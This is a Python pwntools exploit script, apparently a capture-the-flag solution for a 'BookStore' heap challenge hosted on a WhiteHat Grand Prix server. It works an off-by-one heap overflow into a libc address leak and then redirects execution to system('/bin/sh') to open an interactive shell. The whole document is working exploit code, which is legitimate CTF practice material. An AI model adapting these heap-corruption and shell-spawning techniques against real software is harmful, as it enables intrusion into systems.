from pwn import *
import sys, time

b = ELF("./BookStore")
l = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add(title, size, brief, refer, yn):
	p.sendlineafter("choice:", "1")
	p.sendafter(":", title)
	p.sendlineafter(":", str(size))
	p.sendafter(":", brief)
	p.sendafter(":", refer)
	p.sendlineafter(")", yn)
	print "added"

def edit(otitle, title, size, brief, yn):
	p.sendlineafter("choice:", "2")
        p.sendafter(":", otitle)
        p.sendafter(":", title)
        p.sendlineafter(":", str(size))
        p.sendafter(":", brief)
        p.sendlineafter(")", yn)
	print "edited"

def rm(title):
	p.sendlineafter("choice:", "3")
	p.sendlineafter("Title:", title)
	print "removed"

def show():
	p.sendlineafter("choice:", "4")

if len(sys.argv) == 1:
	p = process("./BookStore")#, env={"LD_PRELOAD":"./libc-2.27.so"})
else:
	p = remote("pwn02.grandprix.whitehatvn.com", 8005)

add("1\n",0x37,"b\n","ccc\n","N")
add("0\n",0x80,"b\n","ccc\n","N")
add("4\n",0x10,"b\n","ccc\n","N")
add("3\n",0x67,"b\n","ccc\n","N")
rm("0")
edit("3\n", "3\n",0xf0,"b\n","N")
add("5\n",0x90,"b\n","ccc\n","N")

# off by one
payload = "b"*0x60 + p64(0x1c0)
edit("1\n", "1\n",0x68,payload,"N")	# off by one
rm("3")
payload = "b"*0x80
payload += p64(0) + p64(0x50)
payload += p64(0) + p64(0x6021c0)
payload += "a"*32
payload += "\x00\n"
add("overwrite\n",0x2b0,payload,"ccc\n","N")

# leak libc
show()
#print p.recv()
#print p.recv()
p.recvuntil("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
p.recvuntil("m")
leak = u64(p.recvuntil("\x7f").ljust(8,"\x00"))
libc = leak - 0x3c5620
log.info("leak = 0x%x" % leak)
log.info("libc = 0x%x" % libc)

system= libc + l.symbols['system']
binsh = libc + 0x18cd57
scanf=0x0000000000400968
rm("overwrite")
payload = "c"*0x70
payload += p64(0) + p64(0x50)
payload += p64(0) + p64(0x6021C0)
payload += "\x00" * 8
payload += p64(binsh)		# "%s"
payload += "\x00" * 34
payload += p64(system)		# impossible to input 0xff : no libc addr if target doesn't run ASLR
payload += '\n'
add("abdsfe\n",0x2b0,payload,"ccc\n","N")
show()
p.interactive()
